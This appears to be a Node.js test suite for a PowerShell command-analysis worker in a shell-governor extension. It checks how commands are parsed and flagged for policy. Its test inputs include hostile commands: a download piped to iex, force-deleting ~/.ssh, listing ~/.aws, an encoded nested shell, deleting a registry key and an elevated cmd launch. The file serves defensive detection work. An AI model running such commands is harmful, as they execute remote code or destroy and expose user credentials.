// Port of bench/worker-selftest.mjs (spike S3) to the persistent worker's `parse` and `argv` ops.
// The spike's `signature` op (path classes, draft labels) is not ported: see the DROPPED list at the bottom of this file.
import assert from 'node:assert/strict';
import { after, before, describe, it } from 'node:test';
import { join } from 'node:path';
import { CWD, HOME, TEMP, commandNamed, createClient, samePath } from './harness.mjs';

describe('worker selftest port (parse and argv ops)', () => {
    /** @type {import('../../../extensions/shell-governor/lib/pwsh-client.mjs').PwshClient} */
    let client;
    before(() => { client = createClient().client; });
    after(async () => { await client.stop(); });

    // ---- parse op ----
    it('Parse_ValidScript_NoParseErrors', async () => {
        // Arrange
        const script = 'Get-ChildItem -Path . | Select-Object Name';
        // Act
        const facts = await client.parse(script);
        // Assert
        assert.equal(facts.parseErrors.length, 0);
        assert.equal(facts.commandCount, 2);
    });

    it('Parse_SyntaxError_ReportsParseError', async () => {
        // Arrange
        const script = 'if ($true { Write-Output 1 }';
        // Act
        const facts = await client.parse(script);
        // Assert
        assert.ok(facts.parseErrors.length > 0);
    });

    // ---- argv op: analogues of the signature cases that are fact-level ----
    it('Argv_PathCommand_IsExeByBasenameWithResolvedPath', async () => {
        // Arrange / Act
        const facts = await client.argv('.\\tools\\runner.exe --x', CWD);
        // Assert
        const c = facts.commands[0];
        assert.equal(c.name, 'runner');
        assert.equal(c.inv, 'exe');
        assert.ok(samePath(c.exeValue, join(CWD, 'tools', 'runner.exe')), c.exeValue);
    });

    it('Argv_PythonModule_ModuleNameIsValueOfDashM', async () => {
        // Arrange / Act
        const facts = await client.argv('python -m pytest tests', CWD);
        // Assert
        const args = facts.commands[0].args;
        assert.equal(args[0].raw, '-m');
        assert.equal(args[0].takesValue, true);
        assert.equal(args[1].value, 'pytest');
        assert.equal(args[1].valueFor, 0);
        assert.equal(args[2].valueFor, null);
    });

    it('Argv_RemoveItemSwitchesBeforePath_PathArgumentIsPathBound', async () => {
        // Arrange
        const target = join(HOME, '.ssh');
        // Act
        const facts = await client.argv(`Remove-Item -Recurse -Force '${target}'`, CWD);
        // Assert
        const c = commandNamed(facts, 'remove-item');
        assert.ok(c);
        const word = c.args.find((a) => a.k === 'word');
        assert.equal(word.pathParam, true);
        assert.ok(samePath(word.value, target));
        assert.equal(c.args.filter((a) => a.k === 'param' && a.pathParam).length, 0);
    });

    it('Argv_SetContentRelativePath_PathAndValueBoundSeparately', async () => {
        // Arrange / Act
        const facts = await client.argv('Set-Content -Path .\\out.txt -Value x', CWD);
        // Assert
        const c = facts.commands[0];
        assert.equal(c.args.find((a) => a.name === 'Path').pathParam, true);
        assert.equal(c.args.find((a) => a.name === 'Value').pathParam, false);
        const out = c.args.find((a) => a.raw === '.\\out.txt');
        assert.equal(out.pathParam, true);
        assert.equal(out.pathLike, true);
        assert.equal(c.args.find((a) => a.raw === 'x').pathParam, false);
        assert.ok(samePath(c.cwd, CWD));
    });

    it('Argv_RedirectToEnvTemp_RedirectionTargetResolved', async () => {
        // Arrange / Act
        const facts = await client.argv('Write-Output x > $env:TEMP\\a.txt', CWD);
        // Assert
        const r = facts.commands[0].redirs[0];
        assert.equal(r.nullSink, false);
        assert.equal(r.isConst, true);
        assert.ok(samePath(r.value, join(TEMP, 'a.txt')), r.value);
    });

    it('Argv_DownloadPipedToIex_FlagsIexDownloadAndPipeToIex', async () => {
        // Arrange / Act
        const facts = await client.argv('Invoke-WebRequest https://example.com/x.ps1 | iex', CWD);
        // Assert
        assert.equal(facts.flags.iex, true);
        assert.equal(facts.flags.download, true);
        assert.equal(facts.flags.pipeToIex, true);
    });

    it('Argv_SyntaxError_ParseErrorWithCategory', async () => {
        // Arrange / Act
        const facts = await client.argv('if ($true { Write-Output 1 }', CWD);
        // Assert
        assert.ok(facts.parseErrors.length > 0);
        assert.equal(typeof facts.parseErrors[0].category, 'string');
        assert.ok(facts.parseErrors[0].line >= 1);
    });

    it('Argv_Aliases_ResolvedToCmdletNames', async () => {
        // Arrange / Act
        const facts = await client.argv('ls | % { $_.Name }', CWD);
        // Assert
        assert.ok(commandNamed(facts, 'get-childitem'));
        assert.ok(commandNamed(facts, 'foreach-object'));
    });

    it('Argv_GitPushForce_FlagNamePreservedWithSubcommandWord', async () => {
        // Arrange / Act
        const facts = await client.argv('git push --force origin main', CWD);
        // Assert
        const args = facts.commands[0].args;
        assert.equal(args[0].raw, 'push');
        assert.ok(args.some((a) => a.k === 'param' && a.name === 'force'));
    });

    it('Argv_EncodedNestedShellWithDynamicCall_FlagsDynamicEncodedNested', async () => {
        // Arrange / Act
        const facts = await client.argv('& $cmd; powershell -NoProfile -EncodedCommand AAAA', CWD);
        // Assert
        assert.equal(facts.flags.dynamic, true);
        assert.equal(facts.flags.encoded, true);
        assert.equal(facts.flags.nestedShell, true);
    });

    it('Argv_RegistryHklmPath_PathBoundWithRawValue', async () => {
        // Arrange / Act
        const facts = await client.argv('Remove-Item HKLM:\\SOFTWARE\\x', CWD);
        // Assert
        const w = facts.commands[0].args[0];
        assert.equal(w.pathParam, true);
        assert.equal(w.value, 'HKLM:\\SOFTWARE\\x');
    });

    it('Argv_SystemFileRead_PathBoundWithValue', async () => {
        // Arrange
        const hosts = join(process.env.SystemRoot ?? 'C:\\Windows', 'System32', 'drivers', 'etc', 'hosts');
        // Act
        const facts = await client.argv(`Get-Content ${hosts}`, CWD);
        // Assert
        const w = facts.commands[0].args[0];
        assert.equal(w.pathParam, true);
        assert.ok(samePath(w.value, hosts), w.value);
    });

    it('Argv_DotNetFileWrite_ReportedWithTypeMemberAndConstantArguments', async () => {
        // Arrange
        const target = join(TEMP, 'y.txt');
        // Act
        const facts = await client.argv(`[System.IO.File]::WriteAllText("${target}", "a")`, CWD);
        // Assert
        assert.ok(facts.dotnet.includes('system.io.file::writealltext'));
        const call = facts.dotnetCalls[0];
        assert.equal(call.type, 'system.io.file');
        assert.equal(call.method, 'writealltext');
        assert.equal(call.args[0].isConst, true);
        assert.ok(samePath(call.args[0].value, target));
    });

    it('Argv_StartProcessVerb_FlagsStartProcessAndRunas', async () => {
        // Arrange / Act
        const facts = await client.argv('Start-Process cmd -Verb RunAs', CWD);
        // Assert
        assert.equal(facts.flags.startProcess, true);
        assert.equal(facts.flags.runas, true);
    });

    it('Argv_CopyItemToUserProfile_BothPositionalPathsBoundAndSecondResolved', async () => {
        // Arrange
        const profile = HOME; // $env:USERPROFILE resolves to the configured user home (same source as ~ and $HOME)
        // Act
        const facts = await client.argv('Copy-Item .\\a.txt $env:USERPROFILE\\Desktop\\b.txt', CWD);
        // Assert
        const words = facts.commands[0].args.filter((a) => a.k === 'word');
        assert.equal(words.length, 2);
        assert.ok(words.every((w) => w.pathParam));
        assert.ok(samePath(words[1].value, join(profile, 'Desktop', 'b.txt')), words[1].value);
    });

    it('Argv_NoCwd_CwdUnknown', async () => {
        // Arrange / Act
        const facts = await client.argv('Get-Content .\\notes.txt', null);
        // Assert
        const c = facts.commands[0];
        assert.equal(c.cwdKnown, false);
        assert.equal(c.cwd, null);
        assert.equal(c.args[0].pathParam, true);
    });

    it('Argv_TildeSecretPath_RawValueKeptForPolicy', async () => {
        // Arrange / Act
        const facts = await client.argv('Get-ChildItem -Recurse ~\\.aws', CWD);
        // Assert
        const w = facts.commands[0].args.find((a) => a.k === 'word');
        assert.equal(w.value, '~\\.aws');
        assert.equal(w.pathParam, true);
        assert.equal(w.pathLike, true);
    });

    it('Argv_DynamicPathExpression_NotConstant', async () => {
        // Arrange / Act
        const facts = await client.argv('Remove-Item $dir\\x.txt', CWD);
        // Assert
        const w = facts.commands[0].args[0];
        assert.equal(w.isConst, false);
        assert.equal(w.pathParam, true);
    });

    it('Argv_DownloadWithoutExecution_OnlyDownloadFlag', async () => {
        // Arrange / Act
        const facts = await client.argv('Invoke-RestMethod https://example.com/api', CWD);
        // Assert
        assert.equal(facts.flags.download, true);
        assert.equal(facts.flags.iex, false);
        assert.equal(facts.flags.pipeToIex, false);
        assert.equal(facts.flags.nestedShell, false);
    });
});

// DROPPED from worker-selftest.mjs (11 of the 32 checks; they test the removed `signature` op, not parse/argv):
//  - "no literal values in native subcommand slots (gh api with a path)"  — signature privacy masking (Get-SafeToken)
//  - "packed flag value never becomes a parameter name (mysql -p<secret>)" — signature privacy masking (Get-SafeFlag)
//  - the 8 draft-label checks (SAFE-RULE / DANGER-RULE / SYNTAX / UNKNOWN) — corpus-clustering draft rules (bench/corpus/rules.mjs)
//  - "write inside the cwd is WRITE-LOCAL (not DANGER)" — draft-label rule
// The remaining 21 checks (2 parse + 19 signature cases) are ported above as fact-level analogues; the path-class
// part of those cases (secrets/system/temp/registry/...) is T4 (paths.mjs) and the verdict part is T8 (engine).
